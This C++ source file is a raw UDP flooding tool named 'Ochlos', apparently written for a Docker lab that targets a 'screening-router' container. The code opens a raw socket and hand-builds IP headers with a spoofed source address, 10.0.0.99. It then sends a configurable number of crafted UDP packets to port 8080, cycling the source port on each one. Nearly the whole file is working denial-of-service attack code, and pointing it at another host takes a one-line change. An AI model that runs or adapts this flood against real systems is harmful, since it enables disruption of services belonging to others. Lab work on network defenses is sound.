// UDP Flooding

#include "../include/ochlos_net.hpp"
#include <arpa/inet.h>
#include <chrono>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <netdb.h>
#include <netinet/in.h>
#include <ratio>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    std::cout << "[Ochlos] Raw UDP Flooding Attack Tool Started.\n";

    // 1. Create Raw Socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        std::cerr << "[-] Raw socket creation failed. (Check root/CAP_NET_RAW privileges)\n";
        return 1;
    }

    // 2. IP_HDRINCL 설정
    // L3 IPv4 header 직접 주입을 허용한다.
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        std::cerr << "[-] setsockopt(IP_HDRINCL) failed: " << strerror(errno) << "\n";
        close(sock);
        return 1;
    }

    // 3. Target host DNS 해석
    // Docker DNS를 이용하여서 target인 screening-router의 IPv4를 조회한다.
    // 애초에 docker의 external network를 연결하였기 때문에, 이름으로도 조회가 가능하다.
    const char *target_host = "screening-router";
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    if (getaddrinfo(target_host, nullptr, &hints, &res) != 0 || res == nullptr) {
        std::cerr << "[-] Failed to resolve target host: " << target_host << "\n";
        close(sock);
        return 1;
    }

    uint32_t dst_ip = reinterpret_cast<struct sockaddr_in *>(res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);

    // 4. 출발지 IP Spoofing 주소 및 target port를 설정한다.
    uint32_t src_ip = 0;
    inet_pton(AF_INET, "10.0.0.99", &src_ip);
    uint16_t dst_port = 8080;

    // 5. sendto() 전송용 target_addr 구조체 초기화
    // OS의 routing subsystem을 위해서 필요하다.
    struct sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(dst_port);
    target_addr.sin_addr.s_addr = dst_ip;

    // 6. packet 반복 전송 횟수 설정
    int repeat_count = (argc > 1) ? std::atoi(argv[1]) : 1000;
    std::cout << "[Ochlos] Sending " << repeat_count << " Raw UDP packets to screening-router:8080...\n";

    // 7. 더미 페이로드 패킷 크기 계산
    const char *payload = "OCHLOS_UDP_BENCHMARK_DATA";
    uint16_t payload_len = static_cast<uint16_t>(std::strlen(payload));
    uint16_t total_packet_len = sizeof(IPHeader) + sizeof(UDPHeader) + payload_len;
    char packet_buffer[1500]; // MTU 이내

    int sent_count = 0;
    auto start_time = std::chrono::steady_clock::now();

    // 8. 전송 Loop
    for (int i = 0; i < repeat_count; i++) {
        uint16_t src_port = 10000 + (i % 55000); // Port는 10000~64999 사이로 순환되도록
        craft_udp_packet(packet_buffer, src_ip, dst_ip, src_port, dst_port, payload, payload_len, i);

        int sent_bytes = sendto(sock, packet_buffer, total_packet_len, 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));

        if (sent_bytes < 0) {
            std::cerr << "[-] sendto() failed. errno: " << errno << " (" << strerror(errno) << ")\n";
            break;
        }

        sent_count++;
    }

    auto end_time = std::chrono::steady_clock::now();
    std::chrono::duration<double, std::milli> elapsed = end_time - start_time;

    std::cout << "[+] Finished: " << sent_count << "/" << repeat_count << " packets sent in " << elapsed.count() << "ms.\n";

    close(sock);

    return 0;
}